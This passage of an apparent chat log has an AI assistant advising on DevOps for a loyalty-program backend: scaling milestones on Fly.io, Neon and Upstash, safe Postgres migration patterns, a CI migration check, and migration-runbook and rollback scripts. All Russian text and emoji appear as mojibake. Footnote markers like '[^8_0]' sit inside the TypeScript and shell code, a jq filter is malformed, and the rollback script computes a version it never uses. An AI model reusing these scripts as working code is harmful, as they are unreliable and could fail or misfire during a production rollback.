    for (const alert of alerts) {
      if (alert.percentage > 90) {
        // CRITICAL: > 90%
        this.logger.error('‚ö†Ô∏è CRITICAL: Usage limit approaching', alert);
        // Send Telegram notification
      } else if (alert.percentage > 80) {
        // WARNING: 80-90%
        this.logger.warn('‚ö†Ô∏è WARNING: High usage detected', alert);
      }
    }
  }
}
```

**Telegram alert:**

```
‚ö†Ô∏è WARNING: Usage Limit Alert

Service: Upstash Redis
Metric: Commands per day
Current: 8,500 / 10,000 (85%)

Action: Consider optimizing cache usage or upgrading plan.
```


***

–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å —Å –ø–æ—Å–ª–µ–¥–Ω–∏–º–∏ 2 –≤–æ–ø—Ä–æ—Å–∞–º–∏ (scaling strategy + final summary)? üéØ

---

# –ø—Ä–æ–¥–æ–ª–∂–∏

–ü—Ä–æ–¥–æ–ª–∂–∞—é —Å –ø–æ—Å–ª–µ–¥–Ω–∏–º–∏ –≤–æ–ø—Ä–æ—Å–∞–º–∏! üöÄ

***

### **3Ô∏è‚É£4Ô∏è‚É£ Scaling strategy: –ö–æ–≥–¥–∞ –∏ –∫–∞–∫ –ø–µ—Ä–µ—Ö–æ–¥–∏—Ç—å —Å free tier –Ω–∞ –ø–ª–∞—Ç–Ω—ã–π?**

**–í–û–ü–†–û–°:** –ö–∞–∫ –ø–æ–Ω—è—Ç—å —á—Ç–æ –ø–æ—Ä–∞ –º–∞—Å—à—Ç–∞–±–∏—Ä–æ–≤–∞—Ç—å—Å—è –∏ —á—Ç–æ —É–ª—É—á—à–∞—Ç—å –ø–µ—Ä–≤—ã–º?

**–ú–û–ô SCALING ROADMAP:**

```markdown
# üìà SCALING MILESTONES & UPGRADE PATH

## üü¢ MILESTONE 1: MVP Launch (0-500 –≥–æ—Å—Ç–µ–π)
**Current free tier –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ:**
- Fly.io: 3 VM √ó 256 MB
- Neon.tech: 3 GB storage
- Upstash: 10,000 commands/–¥–µ–Ω—å
- Vercel: 100 GB bandwidth
- R2: 10 GB storage

**–°—Ç–æ–∏–º–æ—Å—Ç—å: $0/–º–µ—Å—è—Ü**
**Capacity:**
- 500 –≥–æ—Å—Ç–µ–π
- 5,000 —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π/–º–µ—Å—è—Ü
- 10-20 concurrent users

---

## üü° MILESTONE 2: First Paying Tenants (500-2,000 –≥–æ—Å—Ç–µ–π)
**Bottlenecks –Ω–∞—á–∏–Ω–∞—é—Ç –ø–æ—è–≤–ª—è—Ç—å—Å—è:**

### –ü–µ—Ä–≤–∞—è –ø—Ä–æ–±–ª–µ–º–∞: RAM –Ω–∞ Fly.io VM
**–°–∏–º–ø—Ç–æ–º—ã:**
- Memory usage > 90%
- Slow response times
- OOM (Out of Memory) crashes

**Upgrade #1: Fly.io VM RAM** (–ü–†–ò–û–†–ò–¢–ï–¢ 1)
```bash
# Upgrade API VM: 256 MB ‚Üí 512 MB
fly scale memory 512 -a max-loyalty-prod --process api

# Cost: $5-10/–º–µ—Å—è—Ü
```


### –í—Ç–æ—Ä–∞—è –ø—Ä–æ–±–ª–µ–º–∞: Database storage

**–°–∏–º–ø—Ç–æ–º—ã:**

- Neon warning: "2.8 GB / 3 GB used"

**Upgrade \#2: Neon.tech storage** (–ü–†–ò–û–†–ò–¢–ï–¢ 2)

```bash
# Scale plan: Launch (free) ‚Üí Scale ($19/–º–µ—Å—è—Ü)
# - 10 GB storage
# - 100 compute hours
# - Point-in-time recovery 30 days
```

**–°—Ç–æ–∏–º–æ—Å—Ç—å: ~\$30/–º–µ—Å—è—Ü**
**Capacity:**

- 2,000 –≥–æ—Å—Ç–µ–π
- 20,000 —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π/–º–µ—Å—è—Ü
- 50-100 concurrent users

---

## üü† MILESTONE 3: Product-Market Fit (2,000-10,000 –≥–æ—Å—Ç–µ–π)

**–ù—É–∂–Ω–æ –º–∞—Å—à—Ç–∞–±–∏—Ä–æ–≤–∞—Ç—å –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä—É:**

### Upgrade \#3: Multiple Fly.io VMs (Horizontal scaling)

```bash
# Scale API: 1 VM ‚Üí 3 VMs
fly scale count 3 --process api

# Auto-scaling rules
fly autoscale set api \
  --min 2 \
  --max 5 \
  --metric concurrency=200

# Cost: $20-40/–º–µ—Å—è—Ü
```


### Upgrade \#4: Redis capacity (Upstash Pro)

**–°–∏–º–ø—Ç–æ–º—ã:**

- Hitting 10,000 commands/–¥–µ–Ω—å
- Need more cache storage

```bash
# Upstash Pro plan
# - 100,000 commands/–¥–µ–Ω—å
# - 1 GB storage
# - Cost: $10/–º–µ—Å—è—Ü
```


### Upgrade \#5: CDN Cloudflare Pro

**–ó–∞—á–µ–º:**

- Advanced caching rules
- Better WAF
- Image optimization
- Cost: \$20/–º–µ—Å—è—Ü

**–°—Ç–æ–∏–º–æ—Å—Ç—å: ~\$90/–º–µ—Å—è—Ü**
**Capacity:**

- 10,000 –≥–æ—Å—Ç–µ–π
- 100,000 —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π/–º–µ—Å—è—Ü
- 200-500 concurrent users

---

## üî¥ MILESTONE 4: Scale Up (10,000-50,000 –≥–æ—Å—Ç–µ–π)

**–ü–µ—Ä–µ—Ö–æ–¥ –Ω–∞ dedicated infrastructure:**

### Upgrade \#6: Dedicated Database (Neon Business)

```bash
# Neon Business: $69/–º–µ—Å—è—Ü
# - 50 GB storage
# - Dedicated compute
# - Read replicas
# - 7-day PITR
```


### Upgrade \#7: Separate infrastructure zones

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ   Zone 1: EU (Frankfurt)            ‚îÇ
‚îÇ   - Backend API cluster             ‚îÇ
‚îÇ   - PostgreSQL primary              ‚îÇ
‚îÇ   - Redis primary                   ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ   Zone 2: US (Virginia) - Replica   ‚îÇ
‚îÇ   - Read-only API                   ‚îÇ
‚îÇ   - PostgreSQL read replica         ‚îÇ
‚îÇ   - Redis replica                   ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```


### Upgrade \#8: Managed Kubernetes (Fly.io ‚Üí GKE/EKS)

**–ó–∞—á–µ–º:**

- Advanced orchestration
- Blue-green deployments
- Auto-scaling –ø–æ CPU/Memory
- Cost: \$100-200/–º–µ—Å—è—Ü

**–°—Ç–æ–∏–º–æ—Å—Ç—å: ~\$300/–º–µ—Å—è—Ü**
**Capacity:**

- 50,000 –≥–æ—Å—Ç–µ–π
- 500,000 —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π/–º–µ—Å—è—Ü
- 1,000+ concurrent users

---

## DECISION MATRIX: –ö–æ–≥–¥–∞ —á—Ç–æ —É–ª—É—á—à–∞—Ç—å?

| –ú–µ—Ç—Ä–∏–∫–∞ | Threshold | Action |
| :-- | :-- | :-- |
| **VM Memory** > 85% | Upgrade RAM | Add 256 MB |
| **VM CPU** > 80% | Scale horizontally | +1 VM |
| **DB Storage** > 90% | Upgrade plan | +10 GB |
| **DB Connections** > 80 | Connection pooling | Pgbouncer |
| **Redis Commands** > 8,000/day | Upgrade plan | Pro tier |
| **API Response Time** p95 > 1s | Optimize queries | Add indexes |
| **Error Rate** > 1% | Investigate | Fix bugs |
| **Bandwidth** > 80 GB | CDN optimization | Upgrade Cloudflare |


---

## MONITORING TRIGGERS

```typescript
// auto-scaling-monitor.service.ts
@Injectable()
export class AutoScalingMonitor {
  @Cron('*/5 * * * *') // Every 5 minutes
  async checkScalingNeeds() {
    const metrics = await this.collectMetrics();
    
    // CPU sustained > 80% for 15 minutes
    if (metrics.cpu.avg15min > 80) {
      await this.scaleUp('cpu');
    }
    
    // Memory > 85%
    if (metrics.memory.percentage > 85) {
      await this.scaleUp('memory');
    }
    
    // Queue depth > 1000 jobs
    if (metrics.queue.depth > 1000) {
      await this.scaleUp('worker');
    }
    
    // Response time p95 > 2s
    if (metrics.responseTime.p95 > 2000) {
      await this.investigateSlowness();
    }
  }
  
  private async scaleUp(type: 'cpu' | 'memory' | 'worker') {
    this.logger.warn(`‚ö†Ô∏è Scaling trigger: ${type}`);
    
    // Notify admin
    await this.sendTelegramAlert({
      message: `üöÄ Auto-scaling triggered: ${type}`,
      metrics: await this.collectMetrics(),
    });
    
    // Execute scaling (if auto-scaling enabled)
    if (process.env.AUTO_SCALING === 'true') {
      switch (type) {
        case 'cpu':
        case 'memory':
          await this.scaleFlyVMs();
          break;
        case 'worker':
          await this.scaleWorkerPool();
          break;
      }
    }
  }
}
```

```

***

### **3Ô∏è‚É£5Ô∏è‚É£ Zero-downtime database migrations: –ö–∞–∫ –º–∏–≥—Ä–∏—Ä–æ–≤–∞—Ç—å —Å—Ö–µ–º—É –±–µ–∑ –æ—Å—Ç–∞–Ω–æ–≤–∫–∏?**

**–í–û–ü–†–û–°:** –î–æ–±–∞–≤–ª—è–µ–º –Ω–æ–≤—É—é –∫–æ–ª–æ–Ω–∫—É –∏–ª–∏ –∏–Ω–¥–µ–∫—Å - –∫–∞–∫ –Ω–µ –ø–æ–ª–æ–∂–∏—Ç—å production?

**–ú–û–Å –†–ï–®–ï–ù–ò–ï: Safe migration patterns**

```markdown
# üîÑ SAFE DATABASE MIGRATION PATTERNS

## ‚úÖ SAFE: Add nullable column
```sql
-- ‚úÖ –ë–µ–∑–æ–ø–∞—Å–Ω–æ: –¥–æ–±–∞–≤–ª—è–µ–º nullable –∫–æ–ª–æ–Ω–∫—É
ALTER TABLE "Guest" ADD COLUMN "middle_name" TEXT;

-- –ó–∞–ø–æ–ª–Ω—è–µ–º –¥–∞–Ω–Ω—ã–µ –ø–æ—Å—Ç–µ–ø–µ–Ω–Ω–æ (–≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏)
-- UPDATE "Guest" SET "middle_name" = ... WHERE ...
```


## ‚ùå UNSAFE: Add NOT NULL column

```sql
-- ‚ùå –û–ü–ê–°–ù–û: –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ —É–ø–∞–¥—ë—Ç –µ—Å–ª–∏ –Ω–µ –∑–Ω–∞–µ—Ç –ø—Ä–æ –Ω–æ–≤—É—é –∫–æ–ª–æ–Ω–∫—É
ALTER TABLE "Guest" ADD COLUMN "required_field" TEXT NOT NULL DEFAULT 'value';

-- SOLUTION: Multi-step migration
-- Step 1: Add nullable
ALTER TABLE "Guest" ADD COLUMN "required_field" TEXT;

-- Step 2: Deploy app that handles NULL
-- (deploy v2 app)

-- Step 3: Backfill data
UPDATE "Guest" SET "required_field" = 'default' WHERE "required_field" IS NULL;

-- Step 4: Add NOT NULL constraint
ALTER TABLE "Guest" ALTER COLUMN "required_field" SET NOT NULL;
```


## ‚úÖ SAFE: Add index concurrently

```sql
-- ‚úÖ –ë–µ–∑–æ–ø–∞—Å–Ω–æ: –Ω–µ –±–ª–æ–∫–∏—Ä—É–µ—Ç —Ç–∞–±–ª–∏—Ü—É
CREATE INDEX CONCURRENTLY "Guest_email_idx" ON "Guest"("email");

-- ‚ùå –û–ü–ê–°–ù–û: –±–ª–æ–∫–∏—Ä—É–µ—Ç —Ç–∞–±–ª–∏—Ü—É –Ω–∞ –≤—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è
CREATE INDEX "Guest_email_idx" ON "Guest"("email");
```


## ‚úÖ SAFE: Rename column (multi-step)

```sql
-- Want to rename: "phone" ‚Üí "phone_number"

-- Step 1: Add new column
ALTER TABLE "Guest" ADD COLUMN "phone_number" TEXT;

-- Step 2: Deploy app that writes to BOTH columns
-- (app v2 handles both phone and phone_number)

-- Step 3: Backfill data
UPDATE "Guest" SET "phone_number" = "phone" WHERE "phone_number" IS NULL;

-- Step 4: Deploy app that reads from phone_number only
-- (app v3 uses only phone_number)

-- Step 5: Drop old column
ALTER TABLE "Guest" DROP COLUMN "phone";
```


## ‚úÖ SAFE: Add foreign key (validated later)

```sql
-- Step 1: Add FK without validation (instant)
ALTER TABLE "BallTransaction" 
  ADD CONSTRAINT "fk_guest_card" 
  FOREIGN KEY ("guest_card_id") 
  REFERENCES "GuestCard"("id") 
  NOT VALID;

-- Step 2: Validate in background (–Ω–µ –±–ª–æ–∫–∏—Ä—É–µ—Ç writes)
ALTER TABLE "BallTransaction" 
  VALIDATE CONSTRAINT "fk_guest_card";
```


## ‚ùå UNSAFE: Drop column immediately

```sql
-- ‚ùå –û–ü–ê–°–ù–û: —Å—Ç–∞—Ä–∞—è –≤–µ—Ä—Å–∏—è app –≤—Å—ë –µ—â—ë –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —ç—Ç—É –∫–æ–ª–æ–Ω–∫—É
ALTER TABLE "Guest" DROP COLUMN "old_field";

-- SOLUTION: Multi-step
-- Step 1: Deploy app that doesn't use old_field
-- Step 2: Wait 24 hours (—É–±–µ–¥–∏—Ç—å—Å—è —á—Ç–æ —Å—Ç–∞—Ä—ã—Ö –∏–Ω—Å—Ç–∞–Ω—Å–æ–≤ –Ω–µ—Ç)
-- Step 3: Drop column
ALTER TABLE "Guest" DROP COLUMN "old_field";
```


---

## üõ°Ô∏è MIGRATION SAFETY CHECKLIST

```yaml
# .github/workflows/migration-check.yml
name: Migration Safety Check

on:
  pull_request:
    paths:
      - 'prisma/migrations/**'

jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Check for unsafe patterns
        run: |
          # –ü—Ä–æ–≤–µ—Ä—è–µ–º —á—Ç–æ –Ω–µ—Ç –Ω–µ–±–µ–∑–æ–ø–∞—Å–Ω—ã—Ö –ø–∞—Ç—Ç–µ—Ä–Ω–æ–≤
          
          if grep -r "ADD COLUMN.*NOT NULL" prisma/migrations/; then
            echo "‚ùå Found ADD COLUMN NOT NULL - unsafe!"
            exit 1
          fi
          
          if grep -r "CREATE INDEX" prisma/migrations/ | grep -v "CONCURRENTLY"; then
            echo "‚ùå Found CREATE INDEX without CONCURRENTLY - unsafe!"
            exit 1
          fi
          
          if grep -r "ALTER TABLE.*DROP COLUMN" prisma/migrations/; then
            echo "‚ö†Ô∏è Found DROP COLUMN - ensure old code doesn't use it!"
            # Warning, not error
          fi
          
          if grep -r "ALTER TABLE.*RENAME COLUMN" prisma/migrations/; then
            echo "‚ùå Found RENAME COLUMN - use multi-step migration!"
            exit 1
          fi
          
          echo "‚úÖ Migration safety check passed"
```


---

## üìã MIGRATION RUNBOOK

```typescript
// scripts/run-migration.ts
import { PrismaClient } from '@prisma/client';
import * as readline from 'readline';

async function runMigration() {
  const prisma = new PrismaClient();
  
  console.log('üîç Pre-migration checks...\n');
  
  // 1. Check current connections
  const connections = await prisma.$queryRaw<any[]>`
    SELECT count(*) FROM pg_stat_activity 
    WHERE datname = current_database();
  `;
  console.log(`Active connections: ${connections[^8_0].count}`);
  
  // 2. Check table sizes
  const tableSizes = await prisma.$queryRaw<any[]>`
    SELECT 
      schemaname,
      tablename,
      pg_size_pretty(pg_total_relation_size(schemaname||'.'||tablename)) AS size
    FROM pg_tables
    WHERE schemaname = 'public'
    ORDER BY pg_total_relation_size(schemaname||'.'||tablename) DESC
    LIMIT 10;
  `;
  console.log('\nTop 10 tables by size:');
  console.table(tableSizes);
  
  // 3. Check pending migrations
  const pendingMigrations = await prisma.$queryRaw<any[]>`
    SELECT migration_name, started_at, finished_at
    FROM "_prisma_migrations"
    WHERE finished_at IS NULL;
  `;
  
  if (pendingMigrations.length > 0) {
    console.error('‚ùå Found pending migrations:', pendingMigrations);
    process.exit(1);
  }
  
  // 4. Confirm with user
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });
  
  const answer = await new Promise<string>((resolve) => {
    rl.question('\n‚ö†Ô∏è Ready to run migrations? (yes/no): ', resolve);
  });
  
  if (answer.toLowerCase() !== 'yes') {
    console.log('Migration cancelled');
    process.exit(0);
  }
  
  // 5. Run migration with timeout
  console.log('\nüöÄ Running migrations...');
  const startTime = Date.now();
  
  try {
    await prisma.$executeRawUnsafe('SET statement_timeout = 300000'); // 5 min timeout
    
    // Prisma migrate deploy
    const { execSync } = require('child_process');
    execSync('npx prisma migrate deploy', { stdio: 'inherit' });
    
    const duration = Date.now() - startTime;
    console.log(`\n‚úÖ Migration completed in ${duration}ms`);
    
  } catch (error) {
    console.error('‚ùå Migration failed:', error);
    
    // Attempt rollback
    console.log('\nüîÑ Attempting rollback...');
    // (rollback logic here)
    
    process.exit(1);
  }
  
  // 6. Post-migration verification
  console.log('\nüîç Post-migration checks...');
  
  const healthCheck = await prisma.$queryRaw`SELECT 1`;
  console.log('‚úÖ Database connection OK');
  
  // Check constraints
  const invalidConstraints = await prisma.$queryRaw<any[]>`
    SELECT conname, conrelid::regclass
    FROM pg_constraint
    WHERE convalidated = false;
  `;
  
  if (invalidConstraints.length > 0) {
    console.warn('‚ö†Ô∏è Found non-validated constraints:', invalidConstraints);
  }
  
  console.log('\n‚úÖ All checks passed!');
  
  await prisma.$disconnect();
  rl.close();
}

runMigration();
```


---

## üîô ROLLBACK STRATEGY

```bash
# Emergency rollback script
#!/bin/bash
# scripts/emergency-rollback.sh

echo "üö® EMERGENCY ROLLBACK"

# 1. List recent deployments
fly releases -a max-loyalty-prod

# 2. Get current version
CURRENT_VERSION=$(fly releases -a max-loyalty-prod --json | jq -r '..version')
echo "Current version: $CURRENT_VERSION"

# 3. Rollback to previous
PREVIOUS_VERSION=$((CURRENT_VERSION - 1))
echo "Rolling back to version: $PREVIOUS_VERSION"

# 4. Execute rollback
fly deploy --image $(fly releases -a max-loyalty-prod --json | jq -r ".[^8_1].image_ref")

# 5. Verify
sleep 10
curl -f https://api.max-loyalty.com/health || {
  echo "‚ùå Rollback failed - health check not passing"
  exit 1
}

echo "‚úÖ Rollback successful"

# 6. Rollback database migration (if needed)
read -p "Rollback database migration? (yes/no): " ROLLBACK_DB

if [ "$ROLLBACK_DB" = "yes" ]; then
  echo "üîÑ Rolling back database..."
  
  # Restore from point-in-time backup (1 hour ago)
  neon branches create \
    --from main \
    --timestamp "$(date -u -d '1 hour ago' '+%Y-%m-%dT%H:%M:%SZ')" \
    --name "rollback-$(date +%s)"
  
  echo "‚úÖ Database rollback complete"
  echo "‚ö†Ô∏è Update DATABASE_URL to new branch"
fi
```

```

***

# üéØ **–ò–¢–û–ì–û–í–´–ô SUMMARY: INFRASTRUCTURE & DEVOPS**

## ‚úÖ **–ß–¢–û –ú–´ –î–ï–¢–ê–õ–ò–ó–ò–†–û–í–ê–õ–ò (35 –≤–æ–ø—Ä–æ—Å–æ–≤):**

### **–ë–õ–û–ö 1: DOCKER & CONTAINERIZATION (8 –≤–æ–ø—Ä–æ—Å–æ–≤)**
1. ‚úÖ Multi-stage Dockerfile –¥–ª—è Backend (–æ–ø—Ç–∏–º–∏–∑–∞—Ü–∏—è —Ä–∞–∑–º–µ—Ä–∞)
2. ‚úÖ –ï–¥–∏–Ω—ã–π –æ–±—Ä–∞–∑ –¥–ª—è API/Worker/Cron (—Ä–∞–∑–Ω—ã–µ –ø—Ä–æ—Ü–µ—Å—Å—ã)
3. ‚úÖ Docker Compose –¥–ª—è –ª–æ–∫–∞–ª—å–Ω–æ–π —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏ (—Ç–æ–ª—å–∫–æ –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä–∞)
4. ‚úÖ .dockerignore (–∏—Å–∫–ª—é—á–µ–Ω–∏—è –¥–ª—è –±—ã—Å—Ç—Ä–æ–≥–æ build)
5. ‚úÖ Multi-platform builds (ARM64 + AMD64)
6. ‚úÖ Health check endpoints (–¥–µ—Ç–∞–ª—å–Ω—ã–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ DB/Redis/S3)
7. ‚úÖ Graceful shutdown (–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ SIGTERM)
8. ‚úÖ Secrets management (Fly.io secrets + encryption –≤ –ë–î)

### **–ë–õ–û–ö 2: CI/CD PIPELINE (7 –≤–æ–ø—Ä–æ—Å–æ–≤)**
9. ‚úÖ GitHub Actions workflows (—Ä–∞–∑–¥–µ–ª–µ–Ω–∏–µ –ø–æ –∑–∞–¥–∞—á–∞–º)
10. ‚úÖ Database migrations –≤ Release command
11. ‚úÖ Environment-specific –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ (Zod validation)
12. ‚úÖ Feature flags (simple ‚Üí advanced —Å targeting)
13. ‚úÖ Monitoring –º–µ—Ç—Ä–∏–∫–∏ (Better Stack + custom metrics)
14. ‚úÖ Alerting rules (critical/warning/info)
15. ‚úÖ Structured logging (Winston + Logtail)

### **–ë–õ–û–ö 3: FLY.IO DEPLOYMENT (5 –≤–æ–ø—Ä–æ—Å–æ–≤)**
16. ‚úÖ Fly.io VM —Ä–∞—Å–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ (3 VM: API/Worker/Cron)
17. ‚úÖ PostgreSQL –≤—ã–±–æ—Ä (Neon.tech > Fly.io PostgreSQL)
18. ‚úÖ Redis –≤—ã–±–æ—Ä (Upstash serverless)
19. ‚úÖ –†–µ–≥–∏–æ–Ω —Ä–∞–∑–º–µ—â–µ–Ω–∏—è (Frankfurt `fra`)
20. ‚úÖ Blue-Green deployment (rolling strategy)

### **–ë–õ–û–ö 4: SECURITY & SECRETS (5 –≤–æ–ø—Ä–æ—Å–æ–≤)**
21. ‚úÖ SSL/TLS setup (Cloudflare proxy)
22. ‚úÖ Secrets rotation (dual secrets period –¥–ª—è JWT)
23. ‚úÖ Rate limiting (Cloudflare + Backend –¥–≤—É—Ö—Å–ª–æ–π–Ω—ã–π)
24. ‚úÖ API Keys encryption (AES-256-GCM –≤ –ë–î)
25. ‚úÖ Backup strategy (Neon.tech auto + manual S3 dumps)

### **–ë–õ–û–ö 5: PERFORMANCE & OPTIMIZATION (5 –≤–æ–ø—Ä–æ—Å–æ–≤)**
26. ‚úÖ Database indexes (23 –∏–Ω–¥–µ–∫—Å–∞ –¥–ª—è production)
27. ‚úÖ Caching strategy (4-layer: short/medium/long/session)
28. ‚úÖ Connection pooling (10 connections per 256 MB VM)
29. ‚úÖ Image optimization (sharp + multi-format + CDN)
30. ‚úÖ API compression (Brotli > 1KB responses)

### **–ë–õ–û–ö 6: PRODUCTION READINESS (5 –≤–æ–ø—Ä–æ—Å–æ–≤)**
31. ‚úÖ Production checklist (40+ –ø—É–Ω–∫—Ç–æ–≤ –ø—Ä–æ–≤–µ—Ä–∫–∏)
32. ‚úÖ Disaster recovery playbook (6 —Å—Ü–µ–Ω–∞—Ä–∏–µ–≤ –∞–≤–∞—Ä–∏–π)
33. ‚úÖ Cost optimization (usage tracking + alerts)
34. ‚úÖ Scaling roadmap (4 milestone: 0 ‚Üí 50k –≥–æ—Å—Ç–µ–π)
35. ‚úÖ Zero-downtime migrations (safe patterns + runbook)

***

## üìä **–ò–¢–û–ì–û–í–ê–Ø –ê–†–•–ò–¢–ï–ö–¢–£–†–ê (PRODUCTION-READY):**

```

‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ                        CLOUDFLARE CDN                            ‚îÇ
‚îÇ  - SSL/TLS termination                                          ‚îÇ
‚îÇ  - DDoS protection                                              ‚îÇ
‚îÇ  - WAF (Web Application Firewall)                               ‚îÇ
‚îÇ  - Rate limiting (100 req/min per IP)                           ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
‚îÇ                                    ‚îÇ
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê                 ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ   VERCEL         ‚îÇ                 ‚îÇ   FLY.IO       ‚îÇ
‚îÇ   (Frontend)     ‚îÇ                 ‚îÇ   (Backend)    ‚îÇ
‚îÇ                  ‚îÇ                 ‚îÇ                ‚îÇ
‚îÇ - Next.js 14    ‚îÇ                 ‚îÇ ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê   ‚îÇ
‚îÇ - SSR/SSG       ‚îÇ                 ‚îÇ ‚îÇ API VM   ‚îÇ   ‚îÇ
‚îÇ - Auto CDN      ‚îÇ                 ‚îÇ ‚îÇ 256 MB   ‚îÇ   ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò                 ‚îÇ ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò   ‚îÇ
‚îÇ                ‚îÇ
‚îÇ ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê   ‚îÇ
‚îÇ ‚îÇWorker VM ‚îÇ   ‚îÇ
‚îÇ ‚îÇ 256 MB   ‚îÇ   ‚îÇ
‚îÇ ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò   ‚îÇ
‚îÇ                ‚îÇ
‚îÇ ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê   ‚îÇ
‚îÇ ‚îÇ Cron VM  ‚îÇ   ‚îÇ
‚îÇ ‚îÇ 256 MB   ‚îÇ   ‚îÇ
‚îÇ ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò   ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îò
‚îÇ   ‚îÇ   ‚îÇ
